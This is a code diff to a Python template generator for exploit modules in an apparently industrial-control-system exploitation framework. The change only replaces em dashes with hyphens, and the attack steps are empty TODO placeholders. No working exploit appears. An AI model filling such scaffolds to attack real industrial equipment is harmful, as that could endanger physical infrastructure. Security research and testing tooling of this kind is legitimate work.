 from pathlib import Path
 
-TEMPLATE = '''"""IXF {cve} — {desc}.
+TEMPLATE = '''"""IXF {cve} - {desc}.
 
 CVSS: {cvss} ({severity}) | CWE: CWE-XXX
 Affected: {vendor_title} (model here)
@@ -2027,7 +2027,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {{
-        "name":             "{cve} {vendor_title} — {desc}",
+        "name":             "{cve} {vendor_title} - {desc}",
         "description":      "TODO: 2-4 sentence description.",
         "authors":          ("Your Name (handle)",),
         "references":       ("https://nvd.nist.gov/vuln/detail/{cve}",),
@@ -2069,7 +2069,7 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "{cve} {{vendor}} — {{desc}}\\n\\n"
+                    "{cve} {{vendor}} - {{desc}}\\n\\n"
                     "Step 1: TODO\\n"
                     "Step 2: TODO\\n"
                     "Step 3: TODO\\n"
